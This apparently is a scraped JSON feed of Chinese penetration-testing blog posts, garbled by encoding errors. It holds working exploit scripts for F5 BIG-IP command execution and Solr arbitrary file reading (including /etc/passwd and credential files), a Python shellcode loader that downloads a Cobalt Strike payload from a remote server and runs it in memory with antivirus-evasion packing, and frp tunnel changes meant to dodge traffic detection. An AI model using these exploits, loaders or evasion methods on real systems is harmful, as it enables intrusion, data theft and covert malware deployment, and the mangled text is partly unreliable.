___________ / _| ___| | ___ \\_ _| __ \\ |_ _| ___ \\\\ | |_|___ \\ | |_/ / | | | | \\/_____| | | |_/ / | _| \\ \\ | ___ \\ | | | | _|______| | | __/ | | /\\__/ / | |_/ /_| |_| |_\\ \\ _| |_| | |_| \\____/ \\____/ \\___/ \\____/ \\___/\\_| by æ–¯æ–‡ ''' def exp(url,cmd): try: session = requests.Session() rawBody = &quot;{{\\&quot;utilCmdArgs\\&quot;: \\&quot;-c {}\\&quot;, \\&quot;command\\&quot;: \\&quot;run\\&quot;}}&quot;.format(cmd) headers = {&quot;Accept&quot;:&quot;*/*&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;User-Agent&quot;:&quot;python-requests/2.25.0&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;X-F5-Auth-Token&quot;:&quot;&quot;,&quot;Content-Type&quot;:&quot;application/json&quot;} response = session.post(&quot;{}/mgmt/tm/util/bash&quot;.format(url), data=rawBody,headers=headers, verify=False,auth=HTTPBasicAuth(&quot;admin&quot;,&quot;test&quot;)) result = json.loads(response.content) print(&quot;&gt;url: {}&quot;.format(url)) print(&quot;&gt;command: {}&quot;.format(cmd)) print(&quot;&gt;result: \\n\\n{}&quot;.format(result['commandResult'])) except Exception as e: # print(e) print(&quot;Not vul&quot;) if __name__ == &quot;__main__&quot;: print(banner) exp(sys.argv[1],sys.argv[2]) ","link":"https://www.svenbeast.com/post/6XXqeGdEj/"},{"title":"Solr æ–‡ä»¶è¯»å–å¤ç°é™„EXPåŠä¸ªäººTips","content":"ä¸‹è½½Solr cd solr-8.8.1/bin ./solr start -p 8989 ç„¶åadd core cd /solr-8.8.1/server/solr/ mkdir newcore å¤åˆ¶ /solr-8.8.1/server/solr/configsets/_defaultçš„confæ–‡ä»¶å¤¹è¿›å…¥åˆšæ‰åˆ›å»ºçš„newcoreæ–‡ä»¶å¤¹ ç½‘é¡µä¸Šç‚¹å‡»Add Core è·å¾—coreåå­— http://127.0.0.1:8989/solr/admin/cores?action=STATUS æ‰“å¼€ remote streaming curl -d '{ &quot;set-property&quot; : {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true}}' http://127.0.0.1:8989/solr/newcore/config -H 'Content-type:application/json' è¿›è¡Œæ–‡ä»¶è¯»å– curl &quot;http://127.0.0.1:8989/solr/newcore/debug/dump?param=ContentStreams&quot; -F &quot;stream.url=file:////etc/passwd&quot; Exp : https://github.com/sv3nbeast/Solr-file_read import requests import sys,re,json import threadpool #from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings() banner = ''' _____ _ _____ _ / ____| | | | __ \\ | | | (___ ___ | |_ __ | |__) |___ __ _ __| | \\___ \\ / _ \\| | '__| | _ // _ \\/ _` |/ _` | ____) | (_) | | | | | \\ \\ __/ (_| | (_| | |_____/ \\___/|_|_| |_| \\_\\___|\\__,_|\\__,_| by æ–¯æ–‡ ''' def exp(url): try: dbName = getDb(url) if dbName: session = requests.Session() rawBody = &quot;{ \\&quot;set-property\\&quot; : {\\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\\&quot;:true}}&quot; headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Content-type&quot;:&quot;application/json&quot;,&quot;Accept&quot;:&quot;*/*&quot;} response = session.post(&quot;{}/solr/{}/config&quot;.format(url,dbName), data=rawBody, headers=headers) print(&quot;&gt;Core: {}&quot;.format(dbName)) while True: linux = File(url,dbName) try: print('&gt;result:\\n') if 'Permission' in str(linux): print('Permission denied\\n') continue if 'No such file or directory' in str(linux): print('No such file or directory\\n') continue linux = json.loads(linux) if linux['streams']: print(linux['streams'][0]['stream']) except: r = re.compile('''&lt;str name=&quot;stream&quot;&gt;(.*?)&lt;/str&gt;''') Str = re.findall(r,str(linux)) res = Str[0].replace('\\\\n','\\n') print(res + '\\n') except Exception as e: print(e) # print(&quot;Not vul&quot;) def File(url,dbName): session = requests.Session() paramsGet = {&quot;param&quot;:&quot;ContentStreams&quot;} path = input(&quot;&gt;Path: &quot;) paramsPost = {&quot;stream.url&quot;:&quot;file:///{}&quot;.format(path)} headers = {&quot;User-Agent&quot;:&quot;hack by sskkaayy&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept&quot;:&quot;*/*&quot;} response = session.post(&quot;{}/solr/{}/debug/dump&quot;.format(url,dbName), data=paramsPost, params=paramsGet, headers=headers) return response.content def getDb(url): try: target = url + '/solr/admin/cores?action=STATUS' response = requests.get(target,verify=False,timeout=20) data = response.text if 'å…³äºå…¨ç½‘éƒ¨ç½²360ç§æœ‰äº‘çš„é€šçŸ¥' in data: print('[- èœœç½çƒ¦æ­»å•¦!') return False try: r = re.compile('''&quot;status&quot;:{ &quot;(.*?)&quot;:{''') Str = re.findall(r,str(data)) dbName = Str[0] except: r = re.compile('''&lt;str name=&quot;name&quot;&gt;(.*?)&lt;/str&gt;''') Str = re.findall(r,str(data)) dbName = Str[0] except Exception as e: return False return dbName if __name__ == &quot;__main__&quot;: print(banner) exp(sys.argv[1]) Tips # Solr æ–‡ä»¶è¯»å–æ·±åº¦åˆ©ç”¨ - ç¬¬ä¸€ä¸ª { é¢æ¿çš„-Djetty.home è·¯å¾„}/solr/coreå/conf/solrconfig.xml ç»“æœæœ &quot;config&quot; è·å¾—æ–‡ä»¶åå­— - ç¬¬äºŒä¸ª /home/ç”¨æˆ·å/.bash_history - ç¬¬ä¸‰ä¸ª /opt/solr/server/solr/configsets/_default/conf/solrconfig.xml ç»“æœæœ &quot;config&quot; è·å¾—æ•°æ®åº“è´¦å·å¯†ç  - ç¬¬å››ä¸ª ç›´æ¥è¯»ç›®å½•å¯ä»¥æŠŠç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½æ˜¾ç¤ºå‡ºæ¥ï¼Œç±»ä¼¼å‘½ä»¤ls - ç¬¬äº”ä¸ª æ­¤å¤„æ”¯æŒSSRFï¼Œå¯è€ƒè™‘å¦‚ä½•æ„é€ ç»§ç»­æ¢æµ‹å†…ç½‘ï¼Œæ¯”å¦‚redis PS: è€ç‰ˆæœ¬å›æ˜¾æ˜¯xmlæ ¼å¼ï¼Œæ–°ç‰ˆæœ¬æ˜¯jsonæ ¼å¼ï¼Œéƒ¨åˆ†æ£€æµ‹å·¥å…·æ˜¯æ²¡æœ‰è¦†ç›–å…¨ï¼Œæˆ‘çš„å·¥å…·æ²¡æœ‰è¿™ç§é—®é¢˜ ","link":"https://www.svenbeast.com/post/320hjX2MI/"},{"title":"BypassAVçš„CSä¸Šçº¿","content":"CSç”Ÿæˆcè¯­è¨€çš„payloadï¼Œå–å…¶ä¸­çš„shellcodeï¼Œbase64åŠ å¯†åæ”¾å…¥shellcode.txtï¼Œæ”¾å…¥å…¬ç½‘vpsçš„webæœåŠ¡ä¸­ shellcode=&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc8\\x00\\x00\\x00' import ctypes,urllib.request,codecs,base64 shellcode = urllib.request.urlopen('http://ip/shellcode.txt').read() shellcode = shellcode.strip() shellcode = base64.b64decode(shellcode) shellcode =codecs.escape_decode(shellcode)[0] shellcode = bytearray(shellcode) ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode))) handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) ä¸Šé¢ä»£ç å¤åˆ¶åbase64åŠ å¯†ï¼Œæ”¾å…¥loder.txtæ–‡ä»¶æ”¾å…¥å…¬ç½‘vpsçš„webæœåŠ¡ä¸­ import pickle import ctypes,urllib.request,codecs,base64 sectr = urllib.request.urlopen('http://ip/loader.txt').read() sectr = base64.b64decode(sectr).decode(&quot;utf-8&quot;) class A(object): def __reduce__(self): return (exec, (sectr,)) ret = pickle.dumps(A()) ret_base64 = base64.b64encode(ret) ret_decode = base64.b64decode(ret_base64) pickle.loads(ret_decode) ä¸Šé¢ä»£ç æ”¹å¥½vpsçš„ip pyminifier --nonlatin --replacement-length=10 shellcode.py ä½¿ç”¨æ­¤å‘½ä»¤è¿›è¡Œæ··æ·†ï¼Œæ›´æ¢ä»£ç ï¼Œæœ‰æ²¡æœ‰è¿™æ­¥éƒ½è¡Œï¼Œä¿é™©åŠ ä¸Š ä½¿ç”¨ä»¥ä¸‹æ‰“åŒ…è¿‡ç¨‹ï¼Œç›®çš„æ˜¯å°½é‡å‹ç¼©pyinstallerçš„å•æ–‡ä»¶å¤§å°ï¼Œæ•ˆæœæ˜æ˜¾ï¼Œ10m-&gt;6.å¤šm ï¼Œä»ç„¶å¤Ÿå¤§ï¼Œä½†å·²ç»åŠªåŠ›ç¼©å°äº† pip3 install pipenv //å®‰è£…è™šæ‹Ÿç¯å¢ƒï¼Œä¸ºäº†å‹ç¼©æ‰“åŒ…æ–‡ä»¶å¤§å° æ–°å»ºæ–‡ä»¶å¤¹å½“åšpipenvçš„ç›®å½•ï¼Œæœ€å¥½æ˜¯æ ¹è·¯å¾„ pipenv install pipenv shell pip3 install å®‰è£…æœ¨é©¬éœ€è¦çš„æ¨¡å—å’Œpyinstaller åŒç›®å½•æ”¾å…¥upx.exe pyinstaller -w -F --clean --key 8939usj8suxk2h3 -i ico.ico shellcode.py --keyé€‰é¡¹åŠ ä¸åŠ éƒ½è¡Œï¼Œçœ‹ä¸ªäººå–œå¥½ æ€»ç»“ä¸€ä¸‹: 2021Â·3Â·09 è¿‡ç«ç»’+360å…¨å®¶æ¡¶ å¡å·´æ–¯åŸºå…è´¹ç‰ˆä¸è¡Œï¼Œé™æ€å¯ä»¥ï¼Œæ‰§è¡Œå°±æ€ï¼Œå†…å­˜æ€å¾—ä¸œå—è¥¿åŒ—éƒ½ä¸è®¤å¾—äº† python+pyinstaller+upx+è¿œç¨‹+æ··æ·†+æ— å‚ï¼Œæ²¡æœ‰æ²™ç®±æ£€æµ‹çš„ä»£ç ï¼Œæ€»æ„Ÿè§‰æ— å‚çš„å¯èƒ½å­˜æ´»æ—¶é—´ä¸é•¿ï¼Œå®¹æ˜“è¢«360äº‘æ²™ç®±æ ‡è®°ï¼Œå°±çœ‹6mçš„å¤§å°360ä¼šä¸ä¼šè‡ªåŠ¨ä¸Šä¼ å§ å‚è€ƒé“¾æ¥:https://blog.csdn.net/qq_40989258/article/details/113460218 ","link":"https://www.svenbeast.com/post/c5POOWPbA/"},{"title":"NATè§„åˆ™æ»¥ç”¨å¯¼è‡´çš„å†…ç½‘ä»£ç†","content":"ä»Šæ—¥ä»½Study notes ç›®æ ‡ç½‘ç«™æ—¶å†…ç½‘DMZåŒºçš„æŸä¸ªç«¯å£æ˜ å°„åˆ°å…¬ç½‘æœåŠ¡å™¨æŸä¸ªç«¯å£ä¸Š åœºæ™¯: 1.ç›®æ ‡å…¬ç½‘æœåŠ¡å™¨111.111.111.111:8080ï¼Œä¸ºå†…ç½‘192.168.0.108:8080æ˜ å°„å‡ºæ¥çš„ç½‘ç«™ 2.ç›®æ ‡å…¬ç½‘æœåŠ¡å™¨çš„8081ç«¯å£åŒæ ·è®¾ç½®äº†æ˜ å°„åˆ°å†…ç½‘çš„æŸä¸ªç«¯å£ å¾ˆå¤šä¼ä¸šçš„WebæœåŠ¡ä½¿ç”¨äº†NATç«¯å£æ˜ å°„æ¥è½¬å‘å†…ç½‘çš„ç½‘ç«™ï¼Œè¿™ç§æƒ…å†µè¿˜ä¼šè®©æ¸—é€çš„æ—¶å€™åœ¨è·å¾—æƒé™åï¼Œå‘ç°ç›®æ ‡æ— æ³•å‡ºç½‘ï¼Œæ— æ³•ä»£ç†åˆ°å†…ç½‘æµé‡ï¼Œä½¿ç”¨reGeorgæˆ–è€…Neo-reGeorgç­‰httpä»£ç†å·¥å…·çš„è¯é€Ÿåº¦å´æ— æ³•ä»¤äººæ»¡æ„ åˆ©ç”¨: é¦–å…ˆå°è¯•æ‰«æç›®æ ‡ç«¯å£ï¼Œä»¥nmapä¸ºä¾‹ï¼Œå¦‚æœç›®æ ‡çš„æŸä¸ªç«¯å£ï¼Œæ¯”å¦‚8081ï¼Œæ‰«æç»“æœæ˜¾ç¤ºä¸ºcloseæˆ–è€…openï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥ä½¿ç”¨socks5:111.111.111.111:8081æ¥ä»£ç†è¿™å°æœºå™¨æ˜ å°„åˆ°çš„å†…ç½‘æœºå™¨æµé‡ ç›®æ ‡å­˜åœ¨ç€æœªè¢«ä½¿ç”¨çš„ç«¯å£æ˜ å°„ è·å¾—æƒé™åæ‰‹åŠ¨ç»“æŸå ç”¨NATç«¯å£çš„è¿›ç¨‹ï¼ˆéå¿…è¦æƒ…å†µæœ€å¥½ä¸è¦ç»“æŸï¼‰ åŸå›  ä¸€èˆ¬å†…ç½‘æœåŠ¡å™¨æ˜ å°„å…¬ç½‘çš„è®¾ç½® åˆ©ç”¨iptablesç¼–å†™ç«¯å£è½¬å‘è§„åˆ™æ¥è¾¾åˆ°å†…ç½‘æœåŠ¡è½¬å‘å…¬ç½‘çš„ç›®çš„ï¼Œç„¶è€Œæœ‰çš„æ—¶å€™è®¾ç½®çš„è½¬å‘è§„åˆ™ä¸­çš„ç›®æ ‡å†…ç½‘ä¸šåŠ¡ä¸‹çº¿äº†ï¼Œè€ŒNATè§„åˆ™å¹¶æ²¡æœ‰ä¸€èµ·åˆ é™¤ï¼Œè¿˜æœ‰å…¶ä»–æƒ…å†µå¯¼è‡´çš„æ­¤ç±»NATè§„åˆ™æœªåˆ é™¤ï¼Œè¿è¡ŒæœåŠ¡å·²åœæ­¢çš„ç¾å¦™åœºæ™¯ ps: æ‹œè¯»å€¾æ—‹å¸ˆå‚…æ–‡ç« çœ‹åˆ°çš„ï¼Œè§‰å¾—æœ‰å¿…è¦è®°å°æœ¬æœ¬ï¼Œä¸”è¿˜æœªçœŸå®å°è¯•ï¼Œæœ‰å¾…å®æˆ˜ç¡®è®¤å“¦ ","link":"https://www.svenbeast.com/post/6_134ZiaS/"},{"title":"frpæ”¹é€ ","content":"0x01 frpå¯ä¼˜åŒ–çš„ç‚¹ .inié…ç½®æ–‡ä»¶æ³„éœ²æœåŠ¡å™¨ä¿¡æ¯ éTLSç‰¹å¾æ˜æ˜¾ frp å»ºç«‹ TLS è¿æ¥çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º 0x17 å®¢æˆ·ç«¯çš„ç•™å­˜çš„é…ç½®æ–‡ä»¶è¾ƒæ•æ„Ÿ 0x02 ä¼˜åŒ– .inié…ç½®æ–‡ä»¶æ³„éœ²æœåŠ¡å™¨ä¿¡æ¯ è·¯å¾„: /frp/pkg/msg/msg.go frpcåœ¨è¿æ¥è®¤è¯frpsçš„æ—¶å€™å›æŠŠfrpçš„ç‰ˆæœ¬ä¿¡æ¯ç­‰ç­‰å‘ç»™frpsè¿›è¡Œè®¤è¯ã€‚ ``json:&quot;version&quot;ä¿®æ”¹ä¸º json:&quot;a&quot;`æ¥é€ƒé¿æµé‡è¯†åˆ«ï¼Œä»¥æ­¤ç±»æ¨ éTLSç‰¹å¾æ˜æ˜¾ frpc.ini åŠ å…¥tls_enable = true ä» v0.25.0 ç‰ˆæœ¬å¼€å§‹ frpc å’Œ frps ä¹‹é—´æ”¯æŒé€šè¿‡ TLS åè®®åŠ å¯†ä¼ è¾“ã€‚é€šè¿‡åœ¨ frpc.ini çš„ common ä¸­é…ç½® tlsenable = true æ¥å¯ç”¨æ­¤åŠŸèƒ½ï¼Œå®‰å…¨æ€§æ›´é«˜ã€‚ä¸ºäº†ç«¯å£å¤ç”¨ï¼Œfrp å»ºç«‹ TLS è¿æ¥çš„ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º 0x17ã€‚é€šè¿‡å°† frps.ini çš„ [common] ä¸­ tlsonly è®¾ç½®ä¸º trueï¼Œå¯ä»¥å¼ºåˆ¶ frps åªæ¥å— TLS è¿æ¥ã€‚ ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x17å¯¼è‡´è™½tlsä½†ç‰¹å¾æ˜æ˜¾ ç¯‡å¹…è¾ƒé•¿ï¼Œæ¨èæ­¤å‚è€ƒé“¾æ¥ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä¸º0x17çš„ç‰¹å¾ä¿®æ”¹ å¦‚æœæ˜¯æœ€æ–°ç‰ˆfrpï¼Œ0x17çš„å˜é‡æ”¹åäº†,æ³¨æ„åŒºåˆ† å®¢æˆ·ç«¯çš„æ•æ„Ÿé…ç½®æ–‡ä»¶ ç›®å‰æˆ‘çŸ¥é“çš„æ˜¯3ç§è§£å†³åŠæ³•ï¼Œè‡ªé€‰å³å¯ ä½¿ç”¨è¿œç¨‹åŠ è½½é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹æ–¹æ³•å‚è€ƒæ­¤é“¾æ¥è¿œç¨‹åŠ è½½é…ç½®æ–‡ä»¶ é…ç½®æ–‡ä»¶è‡ªåˆ é™¤ï¼Œä¿®æ”¹æ–¹æ³•å‚è€ƒæ­¤é“¾æ¥é…ç½®æ–‡ä»¶è‡ªåˆ é™¤ å°†å®¢æˆ·ç«¯æ”¹æˆIPå’Œportä¸ºä¼ å…¥å‚æ•°ï¼Œä¸åŠ è½½é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹æ–¹æ³•å‚è€ƒæ­¤é“¾æ¥ä¼ å‚ç‰ˆå®¢æˆ·ç«¯ 0x03 frpä½¿ç”¨ é…ç½®æ–‡ä»¶å’Œfrpæ ¹æ®è‡ªèº«ä½¿ç”¨æƒ…å†µä¿®æ”¹ï¼Œæ¯”å¦‚æ·»åŠ åŸŸå‰ç½®æˆ–ç ”ç©¶ä½¿ç”¨å…¶ä»–åè®®è¿›è¡Œä¼ è¾“ æœåŠ¡ç«¯é…ç½®æ–‡ä»¶åŠå¯åŠ¨ï¼Œåå°è¿è¡Œå‚è€ƒä½¿ç”¨nohupå‘½ä»¤æˆ–è€…ä»¥æœåŠ¡è¿è¡Œ [common] bind_port = 80 å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶åŠå¯åŠ¨ [common] server_addr = x.x.x.x server_port = 80 protocol = tcp tls_enable = true [plugin_socks5] type = tcp remote_port = 6006 plugin = socks5 windowsåå°è¿è¡Œçš„batå‚è€ƒä»£ç  @echo off if &quot;%1&quot; == &quot;h&quot; goto begin mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close)&amp;&amp;exit :begin c:\\frpc.exe -c c:\\frpc.ini æ­¤æ—¶è¿æ¥æœåŠ¡ç«¯çš„socks5ç«¯å£å³å¯ä»£ç†å®¢æˆ·ç«¯çš„æµé‡ ä»¥msfä¸ºä¾‹ï¼Œæ‰«æçš„IPä¸ºä¸å®¢æˆ·ç«¯æœºå™¨åŒä¸€ç½‘æ®µçš„å…¶ä»–windows7æœºå™¨ ","link":"https://www.svenbeast.com/post/HUSusAA15/"},{"title":"çº¢è‰²æ¶ˆå¤±æœ¯â˜oneforallçš„å°æ”¹åŠ¨","content":"å…ˆè¿è¡Œèµ·æ¥ 1.å„apiï¼Œè‡ªè¡Œç”¨å°é£æœºè¿›è¡Œæ³¨å†Œå¥½ è§£å†³çº¢è‰²æŠ¥é”™ 1.yahooæ¨¡å—æŠ¥é”™ï¼Œä»£ç ä¸­è·å¾—é…ç½®ä¸­çš„ä»£ç†æ²¡ç”Ÿæ•ˆï¼Œé‚æŠ¥é”™(æäº†issus)ï¼Œåœ¨yahoo.pyçš„ç¬¬24è¡Œæ’å…¥ self.proxy = self.get_proxy(self.source) 2.githubçš„æ¥å£ä½¿ç”¨çš„è¯­æ³•æœ‰é—®é¢˜ï¼Œæ²¡æ‰¾åˆ°è§£å†³åŠæ³•ï¼Œé‚å¿½ç•¥ã€‚æ²¡æissusï¼Œ(-æ‡’ 3.Fofaçš„æ¨¡å—ç­‰åŒäºä¸å­˜åœ¨ï¼ŒæŠ“äº†ä¸‹åŒ…ï¼Œæ˜¯å› ä¸ºä½¿ç”¨çš„è¯­æ³•éœ€è¦å¸ï¼Œè‚¯å®šæ²¡æœ‰ï¼Œå¿½ç•¥å¿½ç•¥ 4.google_apiçš„æ¨¡å—ï¼Œheaderä¸éœ€è¦äº†ï¼ŒåŠ ä¸Škeyçš„headerå¤´åè€Œä¼šæ˜¾ç¤ºè®¤è¯é”™è¯¯ å°†google_api.pyçš„29è¡Œä»£ç æ³¨é‡Šæ‰å³å¯ 5.114.55.181.28/check_web/databaseInfo_mainSearch.actionè¿™ä¸ªæ˜¯apiå‡çº§äº†ï¼Œä¸€ç›´æ²¡æ¢å¤ï¼Œå¿½ç•¥ è§£å†³ä¸€äº›è¶…æ—¶çº¢è‰² 1.oneforallè®¾ç½®çš„é»˜è®¤è¶…æ—¶å¤ªçŸ­äº†ï¼Œå¤§éƒ¨åˆ†ç½‘ç»œåº”è¯¥è¾¾ä¸åˆ°è¦æ±‚ï¼Œdefault.pyçš„101è¡Œä»£ç æ–Ÿé…Œä¿®æ”¹ä¸€ä¸‹ request_timeout_second = (17.05, 27) # è¯·æ±‚è¶…æ—¶ç§’æ•°(é»˜è®¤connect timoutæ¨èç•¥å¤§äº3ç§’) 2.oneforallé‡Œçš„ä¸€äº›å›½å¤–ç½‘ç«™çš„æ¨¡å—ï¼Œè™½ç„¶å›½å†…è®¿é—®æ…¢ï¼Œä½†æ˜¯èƒ½è®¿é—®ï¼Œæ‰€ä»¥é»˜è®¤æ˜¯å³ä¾¿ä½ è®¾ç½®äº†ä»£ç†ä¹Ÿå¹¶æ²¡æœ‰å¯¹è¿™äº›æ¨¡å—ç”Ÿæ•ˆï¼Œä¼šå¤§æ¦‚ç‡è¶…æ—¶çº¢è‰²ã€‚setting.pyçš„66è¡Œæˆ‘çš„é…ç½®æ˜¯ä»¥ä¸‹çš„ï¼Œå…¨ä¸å…¨ä¸å¤ªæ¸…æ¥šï¼Œå› ä¸ºæˆ‘å…³é—­äº†å¤§éƒ¨åˆ†æ¨¡å—ï¼Œåªä¿ç•™äº†oneforallç‹¬æœ‰çš„æ¨¡å— proxy_partial_module = ['GoogleQuery', 'AskSearch', 'DuckDuckGoSearch', 'GoogleAPISearch', 'GoogleSearch', 'YahooSearch', 'YandexSearch', 'CrossDomainXml', 'ContentSecurityPolicy', 'GithubAPISearch', 'HackerTargetQuery', 'QianXunQuery', 'AskSearch', 'VirusTotalAPIQuery', 'Sublist3rQuery','ArchiveCrawl','CommonCrawl'] # ä»£ç†è‡ªå®šä¹‰çš„æ¨¡å— 3.è™½ç„¶oneforallå­˜åœ¨è®¾ç½®æ‰€æœ‰æ¨¡å—éƒ½å¯ç”¨ä»£ç†çš„é€‰é¡¹ï¼Œä½†çœŸè®¾ç½®äº†ä¹Ÿä¼šæœ‰é—®é¢˜ï¼Œæ²¡æ·±ç©¶ã€‚ 4.ä¸ªäººçš„ä¸€äº›éœ€æ±‚â€”æˆ‘å…³é—­äº†oneforallä¸subfinderé‡å çš„æ¨¡å—ï¼Œä¿ç•™äº†ä»–ç‹¬æœ‰çš„ï¼Œæ˜¯åœ¨settingçš„33è¡Œä»£ç è®¾ç½®çš„ï¼Œå½“ç„¶32è¡Œè¦å†™æ”¹ä¸ºFalseï¼Œä¸‹é¢æ˜¯æˆ‘ç­›é€‰å‡ºæ¥å‡†å¤‡å¯ç”¨çš„ enable_partial_module = ['modules.certificates.google','modules.check.axfr','modules.check.cdx','modules.check.cert','modules.check.csp','modules.check.nsec','modules.check.robots','modules.check.sitemap','modules.crawl.archivecrawl','modules.crawl.commoncrawl','modules.datasets.chinaz_api','modules.datasets.chinaz','modules.datasets.cloudflare_api','modules.datasets.ip138','modules.datasets.netcraft','modules.datasets.qianxun','modules.datasets.wzpc','modules.dnsquery.mx','modules.dnsquery.ns','modules.dnsquery.soa','modules.dnsquery.spf','modules.dnsquery.txt','modules.intelligence.riskiq_api','modules.search.ask','modules.search.baidu','modules.search.ask','modules.search.bing','modules.search.gitee','modules.search.google_api','modules.search.google','modules.search.so','modules.search.sogou','modules.search.yahoo','modules.search.yandex'] # å¯ç”¨éƒ¨åˆ†æ”¶é›†æ¨¡å— å¿…é¡»ç¦ç”¨enable_all_moduleæ‰èƒ½ç”Ÿæ•ˆ 5.åŒæ—¶æˆ‘ä¹Ÿå…³é—­äº†çˆ†ç ´é€‰é¡¹ï¼Œå‡†å¤‡ç”¨ksubdomainè·‘ã€‚ã€‚ æ•ˆæœå›¾: ","link":"https://www.svenbeast.com/post/V-ayqC-IY/"},{"title":"ã€æ•™ç§‘ä¹¦ã€‘Shiroååºåˆ—åŒ–åˆ©ç”¨åˆ†æåŠå…¶ä»–ä¸€äº›æœ‰è¶£çš„çŸ¥è¯†","content":"0x00 èƒŒæ™¯ æ–‡ç« è®°å½•äº†åˆ†æshiroååºåˆ—åŒ–æ¼æ´çš„æ€è·¯å’Œè¿‡ç¨‹ï¼Œæ¼æ´ç”¨çš„æ¬¡æ•°æŒºå¤šï¼Œæ„Ÿè§‰ä¸è®¤çœŸèµ°ä¸€éåˆ†æè¿˜æ˜¯ç¼ºç‚¹ä»€ä¹ˆã€‚æ’ç‰ˆæ˜¯æŒ‰ç…§ä»issuesä¸­è·å¾—ä¿¡æ¯ä¸€æ­¥æ­¥åˆ†æçš„æ€è·¯è¿›è¡Œæ’ç‰ˆçš„ï¼Œ ä¸å¤ªä¸“ä¸š è§è°… â”­â”®ï¹â”­â”® å‹æƒ…æç¤ºï¼šæ–‡ç« å†™çš„æ„Ÿè§‰æ¯”è¾ƒäº²æ°‘ï¼Œç†è®ºä¸Šæœ‰ä¸€äº›å…¶ä»–è¯­è¨€çš„åŸºç¡€éƒ½å¯ä»¥é˜…è¯»ï¼Œæ¯”è¾ƒå€¾å‘äºå†™çš„è¯¦ç»†ä¸€äº›è¿™ç§å†™æ³•(åºŸè¯è¾ƒå¤šï¼Œå¿½ç•¥å³å¯)ï¼Œå¤§æ¦‚æ˜¯çœ‹å¸–æŒ‰ç€æ­¥éª¤èµ°è·Ÿç€æ€è€ƒå¤§æ¦‚è‡ªè¡Œç†è§£çš„ç¨‹åº¦ã€‚ 0x01 æ¢¦å¼€å§‹çš„åœ°æ–¹ ä¸€åˆ‡éƒ½è¦ä»å®˜æ–¹shiroçš„æŸä¸ªäººæå‡ºçš„é—®é¢˜æè¿°å¼€å§‹è¯´èµ· ~ ä¸‹å›¾ä¸ºè°·æ­Œç¿»è¯‘ç»“æœ url: https://issues.apache.org/jira/browse/SHIRO-550 é€šè¿‡æè¿°å¯çŸ¥ï¼š shiro &lt;= 1.2.4 å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ shiroçš„CookieRememberMeManagerç±»é‡Œå¯¹æ¼æ´å‚æ•°rememberMeè¿›è¡Œåºåˆ—åŒ–ï¼ŒåŠ å¯†ç­‰æ“ä½œï¼Œæˆ‘ç†è§£æˆè¿™ä¸ªç±»å’Œè¿™ä¸ªæ¼æ´æœ‰å…³ç³»ï¼Œå¯ä»¥å½“æˆå…¥å£ç‚¹ shiroå¯¹æ¯æ¬¡è®¿é—®éƒ½ä¼šç”¨åˆ°&quot;è®°ä½æˆ‘&quot;çš„åŠŸèƒ½è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š æ£€ç´¢rememberMe cookieçš„å€¼ //cookieä¸­æ˜¯å¦æœ‰è¿™ä¸ªå‚æ•° Base 64è§£ç  //å¯¹å‚æ•°çš„å€¼è¿›è¡Œè§£ç  ä½¿ç”¨AESè§£å¯† //å¯¹å‚æ•°çš„å€¼å†è¿›è¡Œè§£å¯† ä½¿ç”¨Javaåºåˆ—åŒ–ï¼ˆObjectInputStreamï¼‰ååºåˆ—åŒ–ã€‚ //å¯¹è§£å‡ºçš„å‚æ•°çš„å€¼è¿›è¡Œååºåˆ—åŒ– æºä»£ç å­˜åœ¨é»˜è®¤çš„AESåŠ å¯†å¯†é’¥ï¼Œæ‰€æœ‰èƒ½å¤ŸæŸ¥çœ‹æºä»£ç çš„äººéƒ½å¯ä»¥çŸ¥é“é»˜è®¤å¯†é’¥æ˜¯ä»€ä¹ˆ ä»¥æ­¤ç¡®å®šä¸€ä¸ªéœ€è¦é€šè¿‡Debugä»£ç æ¥è¾¾æˆçš„å¤§æ¦‚ç›®çš„ï¼š é€šè¿‡æ§åˆ¶rememberMeå‚æ•°çš„å€¼ä¼ è¾“åŠ å¯†å¥½çš„æ¶æ„åºåˆ—åŒ–payloadï¼ŒæˆåŠŸè®©shiroè¿›è¡Œè§£å¯†åˆ°ååºåˆ—åŒ–çš„æ­¥éª¤å°±å¯ä»¥è¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ å¦‚ä½•æ§åˆ¶rememberMeå‚æ•°çš„å€¼ å¦‚ä½•å¯¹payloadè¿›è¡ŒåŠ å¯† æ ¹æ®åŠ å¯†æ–¹æ³•å¯¹ç”Ÿæˆæ¶æ„åºåˆ—åŒ–payloadè¿›è¡ŒåŠ å¯†æ„é€ åˆ©ç”¨å·¥å…· 0x02 ç§‘æ™®æ—¶é—´ AESåŠ å¯†ç®—æ³•ï¼šå±äºå¯¹ç§°åŠ 